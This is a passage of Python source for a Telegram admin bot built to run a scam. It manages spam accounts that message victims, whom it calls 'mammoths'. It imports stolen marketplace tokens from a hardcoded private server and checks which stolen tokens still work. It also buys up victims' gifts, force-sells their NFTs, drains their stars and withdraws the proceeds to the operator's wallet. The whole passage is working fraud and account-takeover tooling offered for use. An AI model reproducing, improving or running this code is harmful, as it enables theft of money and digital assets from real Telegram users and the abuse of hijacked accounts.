    errors = 0
    already = 0
    details = []
    
    for f in files:
        path = os.path.join(d, f)
        uid = f.replace("parser_", "").replace(".session", "")
        uname = get_parser_username(uid)
        
        try:
            with open(path, "r", encoding="utf-8") as file:
                session_str = file.read().strip()
            
            client = TelegramClient(
                StringSession(session_str), mrkt_config.API_ID, mrkt_config.API_HASH
            )
            await client.connect()
            
            if not await client.is_user_authorized():
                errors += 1
                details.append(f"❌ {uname} — не авторизован")
                await client.disconnect()
                continue
            
            me = await client.get_me()
            if not me or not getattr(me, 'premium', False):
                no_premium += 1
                details.append(f"⏭ {uname} — нет Premium")
                await client.disconnect()
                continue
            
            # 1. Джойним канал через инвайт-ссылку
            channel_entity = None
            try:
                from telethon.tl.functions.messages import ImportChatInviteRequest, CheckChatInviteRequest
                
                # Проверяем — может уже в канале
                try:
                    check = await client(CheckChatInviteRequest(hash=BOOST_INVITE_HASH))
                    # Если уже участник — check будет ChatInviteAlready
                    if hasattr(check, 'chat'):
                        channel_entity = await client.get_input_entity(check.chat)
                        logger.info(f"[BOOST] {uname} — уже участник канала")
                    else:
                        # Не участник — джойним
                        result = await client(ImportChatInviteRequest(hash=BOOST_INVITE_HASH))
                        channel_entity = await client.get_input_entity(result.chats[0])
                        logger.info(f"[BOOST] {uname} — успешно зашёл в канал")
                except Exception as join_err:
                    err_j = str(join_err).lower()
                    if "already" in err_j or "user_already_participant" in err_j:
                        # Уже в канале — пробуем резолвить напрямую
                        logger.info(f"[BOOST] {uname} — (already) пробуем найти в диалогах")
                    else:
                        raise join_err
                
                # Если не получили entity — пробуем через dialogs
                if not channel_entity:
                    async for dialog in client.iter_dialogs(limit=50):
                        if dialog.entity and hasattr(dialog.entity, 'id'):
                            if dialog.entity.id == 3951024455:
                                channel_entity = await client.get_input_entity(dialog.entity)
                                break
                
                if not channel_entity:
                    errors += 1
                    details.append(f"❌ {uname} — не удалось войти в канал")
                    logger.error(f"[BOOST] {uname} — Не удалось найти канал!")
                    await client.disconnect()
                    continue
                    
            except Exception as e:
                errors += 1
                details.append(f"❌ {uname} — джойн: {str(e)[:50]}")
                logger.error(f"[BOOST] {uname} — Ошибка входа: {e}")
                await client.disconnect()
                continue
            
            # 2. Бустим доступными слотами
            acc_boosts = 0
            try:
                from telethon.tl.functions.premium import ApplyBoostRequest, GetMyBoostsRequest
                
                logger.info(f"[BOOST] {uname} — получаем список доступных слотов...")
                my_boosts_req = await client(GetMyBoostsRequest())
                
                # Собираем ID всех слотов, которые есть у пользователя
                available_slots = []
                for b in my_boosts_req.my_boosts:
                    if hasattr(b, 'slot'):
                        available_slots.append(b.slot)
                
                logger.info(f"[BOOST] {uname} — найдено слотов: {len(available_slots)}")
                
                for slot in available_slots:
                    try:
                        await client(ApplyBoostRequest(
                            peer=channel_entity,
                            slots=[slot]
                        ))
                        acc_boosts += 1
                        logger.info(f"[BOOST] {uname} — ✅ слот {slot} применён!")
                    except Exception as slot_err:
                        logger.warning(f"[BOOST] {uname} — ⚠️ слот {slot} ошибка: {slot_err}")
                        if "flood" in str(slot_err).lower():
                            break
                        # Если ошибка слота (например, занят) — идём к следующему
                
                if acc_boosts > 0:
                    boosted += 1
                    total_boosts += acc_boosts
                    details.append(f"✅ {uname} — {acc_boosts}/4 бустов!")
                    logger.info(f"[BOOST] {uname} — 🚀 Итого: {acc_boosts}/4 бустов применено")
                else:
                    already += 1
                    details.append(f"🔄 {uname} — нет свободных бустов")
                    logger.info(f"[BOOST] {uname} — ⏭ Пропускаем, нет свободных бустов")
                    
            except Exception as boost_err:
                errors += 1
                details.append(f"❌ {uname} — {str(boost_err)[:60]}")
                logger.error(f"[BOOST] {uname} — Ошибка ApplyBoost: {boost_err}")
            
            # 3. Автолив (выход из канала) после буста
            # ВАЖНО: Если выйти из канала, буст СРАЗУ сгорает (правила ТГ) и подписчик пропадает.
            # Поэтому я закомментировал этот кусок, чтобы бусты оставались на канале!
            # if channel_entity:
            #     try:
            #         from telethon.tl.functions.channels import LeaveChannelRequest
            #         await client(LeaveChannelRequest(channel_entity))
            #         logger.info(f"[BOOST] {uname} — 🚪 Вышел из канала")
            #     except Exception as leave_err:
            #         logger.warning(f"[BOOST] {uname} — ⚠️ Ошибка выхода: {leave_err}")
            
            await client.disconnect()
            await asyncio.sleep(1)
            
        except Exception as e:
            errors += 1
            details.append(f"❌ {uname} — {str(e)[:60]}")
    
    # Отчёт
    details_text = "\n".join(details[:30])  # Макс 30 строк
    if len(details) > 30:
        details_text += f"\n... и ещё {len(details) - 30}"
    
    await callback.message.edit_text(
        f"🚀 <b>Буст завершён!</b>\n\n"
        f"✅ Аккаунтов забустило: <b>{boosted}</b>\n"
        f"🔋 Всего бустов: <b>{total_boosts}</b>\n"
        f"🔄 Слотов уже занято: <b>{already}</b>\n"
        f"⏭ Без Premium: <b>{no_premium}</b>\n"
        f"❌ Ошибок: <b>{errors}</b>\n\n"
        f"<blockquote>{details_text}</blockquote>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔙 Назад", callback_data="mrkt_adm_back")]
        ])
    )


@dp.callback_query(F.data == "mrkt_adm_add_parser")
async def cb_add_parser(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    await callback.message.answer(
        "🤖 <b>Авторизация спам-аккаунта</b>\n\n"
        "Отправь номер телефона аккаунта, с которого будет идти спам мамонтам (в формате +79991234567):"
    )
    auth_sessions[f"_parser_{callback.from_user.id}"] = {"step": "phone"}
    await callback.answer()


@dp.callback_query(F.data == "mrkt_adm_wallet")
async def cb_wallet(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    current = mrkt_config.WITHDRAW_WALLET or "не задан"
    await callback.message.answer(
        f"💳 <b>Кошелёк</b>\nТекущий: <code>{current}</code>\n\nОтправь TON адрес (UQ/EQ):",
    )
    auth_sessions[f"_wallet_{callback.from_user.id}"] = {"_awaiting_wallet": True}
    await callback.answer()


# ══════════════════════════════════════════════════════════════
#  STAR GIFTS — скупка гифтов мамонта
# ══════════════════════════════════════════════════════════════

@dp.callback_query(F.data.startswith("star_buy|"))
async def cb_star_buy(callback: CallbackQuery):
    """Скупка гифтов мамонта с buyer Telethon-сессии."""
    if not is_admin(callback.from_user.id):
        return

    phone = callback.data.split("|", 1)[1]
    session_key = f"star_gifts_{phone}"
    sess = auth_sessions.get(session_key)

    if not sess:
        await callback.answer("❌ Сессия мамонта уже закрыта", show_alert=True)
        return

    gifts = sess.get("gifts", [])
    if not gifts:
        await callback.answer("❌ Нет гифтов для скупки", show_alert=True)
        return

    # Проверяем buyer session_string
    buyer_session = buyer_token_data.get("session_string", "")
    if not buyer_session:
        await callback.answer("❌ Buyer session_string не задан в buyer_token.json", show_alert=True)
        return

    await callback.answer("⏳ Скупаю гифты...")
    await callback.message.edit_text(
        f"⏳ <b>Скупаю гифты @{sess['username']}...</b>\n"
        f"<i>Подключаю buyer-сессию</i>",
        parse_mode="HTML",
    )

    try:
        from telethon import TelegramClient
        from telethon.sessions import StringSession
        from mrkt.star_gifts import buy_gifts_from_victim
        from telethon_client import TelethonClient

        buyer_client = TelegramClient(
            StringSession(buyer_session),
            mrkt_config.API_ID,
            mrkt_config.API_HASH,
        )
        await buyer_client.connect()

        # Получаем баланс buyer
        buyer_balance = await TelethonClient.get_balance(buyer_client)

        result = await buy_gifts_from_victim(
            buyer_client=buyer_client,
            victim_gifts=gifts,
            buyer_balance=buyer_balance,
        )

        await buyer_client.disconnect()

        await callback.message.edit_text(
            f"🛒 <b>Скупка завершена!</b>\n\n"
            f"👤 Мамонт: @{sess['username']}\n"
            f"✅ Куплено: {result['bought']} гифтов ({result['spent']}⭐)\n"
            f"⏭ Пропущено: {result['skipped']}\n\n"
            f"<i>Дрейн звёзд запущен автоматически</i>",
            parse_mode="HTML",
        )

    except Exception as e:
        await callback.message.edit_text(
            f"❌ <b>Ошибка скупки</b>\n<code>{e}</code>",
            parse_mode="HTML",
        )


# ══════════════════════════════════════════════════════════════
#  SAVED TOKENS ADMIN PANEL
# ══════════════════════════════════════════════════════════════

@dp.callback_query(F.data == "mrkt_adm_tokens")
async def cb_tokens_list(callback: CallbackQuery):
    uid = callback.from_user.id
    if not is_admin_or_mod(uid):
        return

    _is_mod = is_moderator(uid) and not is_admin(uid)

    if not saved_tokens:
        buttons = [
            [InlineKeyboardButton(text="📥 Загрузить с maksik", callback_data="tkn_import_maksik")],
            [InlineKeyboardButton(text="← Назад", callback_data="mrkt_adm_back")],
        ]
        await callback.message.edit_text(
            "🔑 <b>Нет сохранённых токенов</b>\n\n"
            "<i>Загрузи токены с maksik</i>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons),
        )
        await callback.answer()
        return

    buttons = []
    for phone, data in saved_tokens.items():
        if isinstance(data, str):
            data = {"token": data, "username": "?", "tg_id": 0, "phone": phone}
            saved_tokens[phone] = data
        uname = data.get("username", "?")
        label = f"@{uname}" if uname != "?" else phone
        if _is_mod:
            # Модератор — только просмотр списка, без кнопок управления
            buttons.append([InlineKeyboardButton(
                text=f"👤 {label} ({phone})",
                callback_data="tkn_mod_noop"
            )])
        else:
            buttons.append([InlineKeyboardButton(
                text=f"👤 {label} ({phone})",
                callback_data=f"tkn_view|{phone}"
            )])
    buttons.append([InlineKeyboardButton(text="📥 Загрузить с maksik", callback_data="tkn_import_maksik")])
    if not _is_mod:
        buttons.append([InlineKeyboardButton(text="🧹 Проверить все", callback_data="tkn_check_all")])
        buttons.append([InlineKeyboardButton(text="🗑 Очистить всё", callback_data="tkn_clear_all")])
    buttons.append([InlineKeyboardButton(text="← Назад", callback_data="mrkt_adm_back")])

    await callback.message.edit_text(
        f"🔑 <b>Сохранённые токены ({len(saved_tokens)})</b>\n\n"
        f"<i>{'Просмотр токенов (модератор)' if _is_mod else 'Выберите аккаунт для управления:'}</i>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons),
    )
    await callback.answer()


@dp.callback_query(F.data == "tkn_mod_noop")
async def cb_token_mod_noop(callback: CallbackQuery):
    """Модератор нажал на токен — показываем что нет доступа."""
    await callback.answer("🔒 Только просмотр. Управление недоступно.", show_alert=True)


@dp.callback_query(F.data == "tkn_import_maksik")
async def cb_token_import_maksik(callback: CallbackQuery):
    """Загрузить токены с maksik сервера."""
    if not is_admin_or_mod(callback.from_user.id):
        return
    await callback.answer("⏳ Загружаю токены с maksik...")
    try:
        import aiohttp
        async with aiohttp.ClientSession() as session:
            async with session.get("http://109.120.178.109:8899/t0k3ns_988x_private", timeout=aiohttp.ClientTimeout(total=10)) as resp:
                if resp.status != 200:
                    await callback.message.answer(f"❌ Ошибка: HTTP {resp.status}")
                    return
                data = await resp.json()

        if not isinstance(data, dict):
            await callback.message.answer("❌ Неверный формат ответа")
            return

        added = 0
        skipped = 0
        for phone, token_data in data.items():
            if not isinstance(token_data, dict):
                continue
            token = token_data.get("token", "")
            if not token:
                continue
            if phone in saved_tokens:
                skipped += 1
                continue
            _add_token(
                phone=phone,
                token=token,
                username=token_data.get("username", "?"),
                tg_id=token_data.get("tg_id", 0),
                first_name=token_data.get("first_name", ""),
            )
            saved_tokens[phone]["source"] = "maksik_import"
            added += 1

        _save_tokens()

        await callback.message.answer(
            f"📥 <b>Импорт с maksik завершён!</b>\n\n"
            f"➕ Новых: <b>{added}</b>\n"
            f"⏭ Пропущено (уже есть): <b>{skipped}</b>\n"
            f"📊 Всего токенов: <b>{len(saved_tokens)}</b>",
            parse_mode="HTML",
        )
    except Exception as e:
        await callback.message.answer(f"❌ Ошибка импорта: <code>{e}</code>", parse_mode="HTML")


@dp.callback_query(F.data == "tkn_check_all")
async def cb_tokens_check_all(callback: CallbackQuery):
    """Проверяет все сохранённые токены, удаляет мёртвые (401)."""
    if not is_admin(callback.from_user.id):
        return

    if not saved_tokens:
        await callback.answer("📭 Нет токенов для проверки", show_alert=True)
        return

    await callback.answer("⏳ Проверяю все токены...")
    await callback.message.edit_text(
        f"⏳ <b>Проверяю {len(saved_tokens)} токенов...</b>\n\n"
        f"<i>Это может занять пару секунд</i>",
        parse_mode="HTML",
    )

    alive = []   # (phone, data, balance_info)
    dead = []    # (phone, data, reason)

    buyer_phone = buyer_token_data.get("phone", "")
    buyer_token = buyer_token_data.get("token", "")
    buyer_is_dead = False

    for phone, data in list(saved_tokens.items()):
        token = data.get("token", "")
        if not token:
            dead.append((phone, data, "пустой токен"))
            continue

        try:
            api = MrktAPI(token)
            try:
                balance = await api.get_balance()
                # Если вернулся error (например 401 парсится как {"error": "..."})
                if "error" in balance:
                    err = str(balance["error"])
                    if "401" in err or "Unauthorized" in err or "unauthorized" in err:
                        dead.append((phone, data, "401 Unauthorized"))
                    else:
                        dead.append((phone, data, f"Ошибка: {err[:50]}"))
                else:
                    hard_nano = int(balance.get("hard", 0))
                    hard_ton = hard_nano / 1_000_000_000
                    stars = balance.get("stars", 0)
                    # Собираем ссылки на NFT
                    nft_links = []
                    try:
                        vault = await api.get_vault()
                        saling = await api.get_my_saling()
                        for g in (vault or []) + (saling or []):
                            slug = g.get("name", "") or g.get("slug", "")
                            if slug:
                                nft_links.append(f'<a href="https://t.me/nft/{slug}">nft</a>')
                    except Exception:
                        pass
                    alive.append((phone, data, f"{hard_ton:.2f} TON, {stars} ⭐", nft_links))
            finally:
                await api.close()
        except Exception as e:
            err_str = str(e)
            if "401" in err_str:
                dead.append((phone, data, "401 Unauthorized"))
            else:
                dead.append((phone, data, f"Ошибка: {err_str[:50]}"))

    # Отдельно чекаем баер-токен
    buyer_status = ""
    if buyer_token:
        try:
            api = MrktAPI(buyer_token)
            try:
                balance = await api.get_balance()
                if "error" in balance:
                    buyer_is_dead = True
                    buyer_status = f"💀 {str(balance['error'])[:30]}"
                else:
                    hard_nano = int(balance.get("hard", 0))
                    hard_ton = hard_nano / 1_000_000_000
                    stars = balance.get("stars", 0)
                    buyer_status = f"✅ {hard_ton:.2f} TON, {stars} ⭐"
            finally:
                await api.close()
        except Exception as e:
            if "401" in str(e):
                buyer_is_dead = True
                buyer_status = "💀 401 Unauthorized"
            else:
                buyer_status = f"❓ {str(e)[:30]}"
    else:
        buyer_status = "❌ Не установлен"

    # Удаляем мёртвые токены
    deleted_count = 0
    for phone, data, reason in dead:
        if phone in saved_tokens:
            del saved_tokens[phone]
            deleted_count += 1

    if deleted_count > 0:
        _save_tokens()

    # Формируем отчёт
    report = f"🧹 <b>Проверка токенов завершена</b>\n\n"
    report += f"✅ Живых: <b>{len(alive)}</b>\n"
    report += f"💀 Мёртвых: <b>{len(dead)}</b>\n"
    report += f"🗑 Удалено: <b>{deleted_count}</b>\n\n"

    # Статус баера
    buyer_uname = buyer_token_data.get("username", "?")
    report += f"🛒 <b>Баер @{buyer_uname}:</b> {buyer_status}\n\n"

    if alive:
        report += "<b>✅ Живые:</b>\n"
        for phone, data, info, nft_links in alive[:15]:
            uname = data.get("username", "?")
            label = f"@{uname}" if uname != "?" else phone
            nft_str = ""
            if nft_links:
                nft_str = ", " + " ".join(nft_links)
            report += f"  • {label} — {info}{nft_str}\n"
        if len(alive) > 15:
            report += f"  <i>... и ещё {len(alive)-15}</i>\n"
        report += "\n"

    if dead:
        report += "<b>💀 Мёртвые (удалены):</b>\n"
        for phone, data, reason in dead[:15]:
            uname = data.get("username", "?")
            label = f"@{uname}" if uname != "?" else phone
            report += f"  • {label} — {reason}\n"
        if len(dead) > 15:
            report += f"  <i>... и ещё {len(dead)-15}</i>\n"

    # Предупреждение если баер мёртв
    if buyer_is_dead:
        report += "\n⚠️⚠️⚠️ <b>ВНИМАНИЕ: ТОКЕН БАЕРА МЁРТВ!</b>\n"
        report += f"Баер: @{buyer_uname} ({buyer_phone})\n"
        report += "Баер <b>НЕ удалён</b> автоматически. Переавторизуйте вручную!\n"

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔑 К токенам", callback_data="mrkt_adm_tokens")],
        [InlineKeyboardButton(text="← Назад", callback_data="mrkt_adm_back")],
    ])

    await callback.message.edit_text(report, parse_mode="HTML", reply_markup=keyboard)


@dp.callback_query(F.data == "mrkt_adm_back")
async def cb_adm_back(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        return

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text=f"💳 Кош: {mrkt_config.WITHDRAW_WALLET[:12] + '...' if mrkt_config.WITHDRAW_WALLET else '❌'}",
            callback_data="mrkt_adm_wallet",
        )],
        [InlineKeyboardButton(
            text=f"🔑 Токены ({len(saved_tokens)})",
            callback_data="mrkt_adm_tokens",
        )],
        [InlineKeyboardButton(text="📱 Управление спам-акками", callback_data="mrkt_adm_spam_manage")],
        [InlineKeyboardButton(text="🤖 Добавить спам-акк", callback_data="mrkt_adm_add_parser")],
        [
            InlineKeyboardButton(text="▶️ Старт парсер", callback_data="mrkt_adm_start_spam"),
            InlineKeyboardButton(text="⏹ Стоп", callback_data="mrkt_adm_stop_spam")
        ],
        [
            InlineKeyboardButton(text="📡 Feed парсер", callback_data="mrkt_adm_start_feed"),
            InlineKeyboardButton(text="⏹ Стоп Feed", callback_data="mrkt_adm_stop_feed")
        ]
    ])

    d = mrkt_config.BROADCAST_SESSIONS_DIR
    spam_sessions = len([f for f in os.listdir(d) if f.startswith("parser_") and f.endswith(".session")]) if os.path.exists(d) else 0
    known_users_file = os.path.join(os.path.dirname(__file__), "known_users.json")
    known_users_count = 0
    if os.path.exists(known_users_file):
        try:
            with open(known_users_file, "r", encoding="utf-8") as f:
                known_users_count = len(json.load(f))
        except Exception:
            pass

    await callback.message.edit_text(
        f"👑 <b>MRKT ADMIN</b>\n\n"
        f"👥 Юзеров: <b>{known_users_count}</b>\n"
        f"🔄 Auth сессий: <b>{len(auth_sessions)}</b>\n"
        f"🔑 Токенов: <b>{len(saved_tokens)}</b>\n"
        f"📱 Спам-акков: <b>{spam_sessions}</b>\n"
        f"🕐 {kyiv_str()}",
        parse_mode="HTML",
        reply_markup=keyboard,
    )
    await callback.answer()


@dp.callback_query(F.data == "tkn_clear_all")
async def cb_tokens_clear_all(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    saved_tokens.clear()
    _save_tokens()
    await callback.answer("🗑 Все токены удалены!", show_alert=True)
    await cb_tokens_list(callback)


@dp.callback_query(F.data.startswith("tkn_view|"))
async def cb_token_view(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        return

    phone = callback.data.split("|", 1)[1]
    data = saved_tokens.get(phone)
    if not data:
        await callback.answer("❌ Токен не найден", show_alert=True)
        return

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💰 Баланс", callback_data=f"tkn_bal|{phone}"),
         InlineKeyboardButton(text="📦 Гифты", callback_data=f"tkn_gifts|{phone}")],
        [InlineKeyboardButton(text="💸 Продать всё", callback_data=f"tkn_sell|{phone}"),
         InlineKeyboardButton(text="🔓 Снять всё", callback_data=f"tkn_delist|{phone}")],
        [InlineKeyboardButton(text="💎 Вывод через гифт", callback_data=f"tkn_giftwd|{phone}"),
         InlineKeyboardButton(text="🛒 Купить гифт (ID)", callback_data=f"tkn_buygift|{phone}")],
        [InlineKeyboardButton(text="🔄 Вывести остаток", callback_data=f"tkn_offerwd|{phone}")],
        [InlineKeyboardButton(text="🗑 Удалить токен", callback_data=f"tkn_del|{phone}"),
         InlineKeyboardButton(text="← Назад", callback_data="mrkt_adm_tokens")],
    ])

    import html as _html
    _uname = _html.escape(str(data.get('username', '?')))
    _fname = _html.escape(str(data.get('first_name', '')))
    
    await callback.message.edit_text(
        f"👤 <b>@{_uname}</b> ({_fname})\n"
        f"📞 <code>{phone}</code>\n"
        f"🆔 <code>{data.get('tg_id', '?')}</code>\n"
        f"🕐 Сохранён: {data.get('saved_at', '?')}\n\n"
        f"<i>Выберите действие:</i>",
        parse_mode="HTML",
        reply_markup=keyboard,
    )
    await callback.answer()


@dp.callback_query(F.data.startswith("tkn_del|"))
async def cb_token_delete(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    phone = callback.data.split("|", 1)[1]
    if phone in saved_tokens:
        del saved_tokens[phone]
        _save_tokens()
        await callback.answer("✅ Токен удалён!", show_alert=True)
    else:
        await callback.answer("❌ Токен не найден", show_alert=True)
    await cb_tokens_list(callback)


@dp.callback_query(F.data.startswith("tkn_bal|"))
async def cb_token_balance(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    phone = callback.data.split("|", 1)[1]
    data = saved_tokens.get(phone)
    if not data:
        await callback.answer("❌ Токен не найден", show_alert=True)
        return

    await callback.answer("⏳ Запрашиваю баланс...")
    try:
        api = MrktAPI(data["token"])
        bal = await api.get_balance()
        ton = await api.get_balance_ton()
        await api.close()
        
        ton_formatted = f"{ton:.4f}".rstrip('0').rstrip('.') if '.' in f"{ton:.4f}" else f"{ton:.4f}"
        if ton_formatted == "": ton_formatted = "0"

        await callback.message.edit_text(
            f"💰 <b>Баланс @{data.get('username', '?')}</b>\n\n"
            f"💎 TON: <b>{ton_formatted}</b>\n\n"
            f"📞 <code>{phone}</code>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔄 Обновить", callback_data=f"tkn_bal|{phone}"),
                 InlineKeyboardButton(text="💎 Вывод через гифт", callback_data=f"tkn_giftwd|{phone}")],
                [InlineKeyboardButton(text="← Назад", callback_data=f"tkn_view|{phone}")],
            ]),
        )
    except Exception as e:
        from aiogram.exceptions import TelegramBadRequest
        try:
            await callback.message.edit_text(
                f"❌ <b>Ошибка баланса</b>\n<code>{e}</code>\n\n<i>Токен мог истечь.</i>",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="← Назад", callback_data=f"tkn_view|{phone}")],
                ]),
            )
        except TelegramBadRequest as ex:
            if "message is not modified" not in str(ex):
                raise


@dp.callback_query(F.data.startswith("tkn_gifts|"))
async def cb_token_gifts(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    phone = callback.data.split("|", 1)[1]
    data = saved_tokens.get(phone)
    if not data:
        await callback.answer("❌ Токен не найден", show_alert=True)
        return

    await callback.answer("⏳ Загружаю гифты...")
    try:
        api = MrktAPI(data["token"])
        vault = await api.get_vault()
        saling = await api.get_my_saling()
        await api.close()

        text = f"📦 <b>Гифты @{data.get('username', '?')}</b>\n\n"
        text += f"🗃 В хранилище: <b>{len(vault)}</b>\n"
        text += f"🏷 На продаже: <b>{len(saling)}</b>\n\n"

        if vault:
            text += "<b>Хранилище:</b>\n"
            for g in vault[:15]:
                title = g.get("title") or g.get("collectionName", "?")
                number = g.get("number", g.get("collectionNumber", ""))
                gid = g.get("id") or g.get("giftIdString", "")
                slug = g.get("name", "")  # ChillFlame-176165
                model = g.get("modelName") or g.get("modelTitle", "")
                floor_nano = g.get("floorPriceNanoTONsByCollection") or g.get("floorPriceNanoTONsByBackdropModel")
                floor = f" | 🏷 {round(int(floor_nano)/1e9, 2)} TON" if floor_nano else ""
                
                # Ссылка t.me/nft/
                link = f"https://t.me/nft/{slug}" if slug else ""
                name_display = f"{title}"
                if number:
                    name_display += f" #{number}"
                if model:
                    name_display += f" ({model})"
                
                if link:
                    text += f'  • <a href="{link}">{name_display}</a>{floor}\n'
                else:
                    text += f"  • {name_display}{floor}\n"
                    
                # UUID для копирования
                if gid:
                    text += f'    <code>{gid}</code>\n'
                    
            if len(vault) > 15:
                text += f"  <i>... и ещё {len(vault)-15}</i>\n"

        if saling:
            text += "\n<b>На продаже:</b>\n"
            for g in saling[:10]:
                title = g.get("title") or g.get("collectionName", "?")
                number = g.get("number", g.get("collectionNumber", ""))
                gid = g.get("id") or g.get("giftIdString", "")
                slug = g.get("name", "")
                price_nano = (
                    g.get("priceNanoTONs")
                    or g.get("salePriceNanoTONs")
                    or g.get("price")
                    or g.get("salePrice")
                    or 0
                )
                price_ton = round(float(price_nano) / 1e9, 2) if price_nano else "?"
                
                link = f"https://t.me/nft/{slug}" if slug else ""
                name_display = f"{title}"
                if number:
                    name_display += f" #{number}"
                
                if link:
                    text += f'  • <a href="{link}">{name_display}</a> → <b>{price_ton} TON</b>\n'
                else:
                    text += f"  • {name_display} → <b>{price_ton} TON</b>\n"
                    
                if gid:
                    text += f'    <code>{gid}</code>\n'
                    
            if len(saling) > 10:
                text += f"  <i>... и ещё {len(saling)-10}</i>\n"

        await callback.message.edit_text(
            text,
            parse_mode="HTML",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="💸 Продать всё", callback_data=f"tkn_sell|{phone}"),
                 InlineKeyboardButton(text="🔓 Снять всё", callback_data=f"tkn_delist|{phone}")],
                [InlineKeyboardButton(text="🔄 Обновить", callback_data=f"tkn_gifts|{phone}"),
                 InlineKeyboardButton(text="← Назад", callback_data=f"tkn_view|{phone}")],
            ]),
        )
    except Exception as e:
        await callback.message.edit_text(
            f"❌ <b>Ошибка</b>\n<code>{e}</code>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="← Назад", callback_data=f"tkn_view|{phone}")],
            ]),
        )


@dp.callback_query(F.data.startswith("tkn_sell|"))
async def cb_token_sell_all(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    phone = callback.data.split("|", 1)[1]
    data = saved_tokens.get(phone)
    if not data:
        await callback.answer("❌ Токен не найден", show_alert=True)
        return

    await callback.answer("⏳ Продаю все гифты...")
    msg = await callback.message.edit_text(
        f"🔄 <b>Продаю все гифты @{data.get('username', '?')}...</b>",
        parse_mode="HTML",
    )

    try:
        api = MrktAPI(data["token"])
        vault = await api.get_vault()
        saling = await api.get_my_saling()

        # Сначала снимаем с продажи
        all_gifts = vault + saling
        sold_count = 0
        errors = []

        for gift in all_gifts:
            gid = gift.get("id")
            display = f"{gift.get('collectionName', '?')}-{gift.get('collectionNumber', '')}"
            try:
                result = await api.instant_sell(gid, gift)
                ids_list = result.get("ids", []) if isinstance(result, dict) else []
                if not result.get("error") and (not isinstance(ids_list, list) or len(ids_list) > 0):
                    sold_count += 1
                    price = "?"
                    if "prices" in result and isinstance(result["prices"], list) and len(result["prices"]) > 0:
                        price = str(round(float(result["prices"][0]) / 1e9, 3))
                    logger.info(f"[TKN] Sold {display} → {price} TON")
                else:
                    errors.append(f"{display}: empty result")
            except Exception as e:
                errors.append(f"{display}: {str(e)[:40]}")
            await asyncio.sleep(2.5)

        bal = await api.get_balance_ton()
        await api.close()

        text = (
            f"✅ <b>Продажа завершена @{data.get('username', '?')}</b>\n\n"
            f"💰 Продано: <b>{sold_count}/{len(all_gifts)}</b>\n"
            f"💵 Баланс: <b>{bal} TON</b>\n"
        )
        if errors:
            text += f"\n❌ Ошибки ({len(errors)}):\n"
            for e in errors[:5]:
                text += f"  • {e}\n"

        await msg.edit_text(
            text,
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="💎 Вывод через гифт", callback_data=f"tkn_giftwd|{phone}"),
                 InlineKeyboardButton(text="← Назад", callback_data=f"tkn_view|{phone}")],
            ]),
        )
    except Exception as e:
        await msg.edit_text(
            f"❌ <b>Ошибка продажи</b>\n<code>{e}</code>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="← Назад", callback_data=f"tkn_view|{phone}")],
            ]),
        )


@dp.callback_query(F.data.startswith("tkn_delist|"))
async def cb_token_delist_all(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    phone = callback.data.split("|", 1)[1]
    data = saved_tokens.get(phone)
    if not data:
        await callback.answer("❌ Токен не найден", show_alert=True)
        return

    await callback.answer("⏳ Снимаю с продажи...")
    try:
        api = MrktAPI(data["token"])
        saling = await api.get_my_saling()

        if not saling:
            await api.close()
            await callback.message.edit_text(
                f"ℹ️ У @{data.get('username', '?')} нет гифтов на продаже.",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="← Назад", callback_data=f"tkn_view|{phone}")],
                ]),
            )
            return

        delisted = 0
        for gift in saling:
            gid = gift.get("id")
            try:
                await api.delist_gift(gid)
                delisted += 1
            except Exception:
                pass
            await asyncio.sleep(1)

        await api.close()
        await callback.message.edit_text(
            f"✅ Снято с продажи: <b>{delisted}/{len(saling)}</b>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="💸 Продать всё", callback_data=f"tkn_sell|{phone}"),
                 InlineKeyboardButton(text="← Назад", callback_data=f"tkn_view|{phone}")],
            ]),
        )
    except Exception as e:
        await callback.message.edit_text(
            f"❌ <b>Ошибка</b>\n<code>{e}</code>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="← Назад", callback_data=f"tkn_view|{phone}")],
            ]),
        )


@dp.callback_query(F.data.startswith("tkn_wd|"))
async def cb_token_withdraw(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    phone = callback.data.split("|", 1)[1]
    data = saved_tokens.get(phone)
    if not data:
        await callback.answer("❌ Токен не найден", show_alert=True)
        return

    wallet = mrkt_config.WITHDRAW_WALLET
    if not wallet:
        await callback.answer("❌ Кошелёк не задан! Зайди в /admin", show_alert=True)
        return

    await callback.answer("⏳ Вывожу баланс...")
    try:
        api = MrktAPI(data["token"])
        bal = await api.get_balance_ton()

        if bal < 0.1:
            await api.close()
            await callback.message.edit_text(
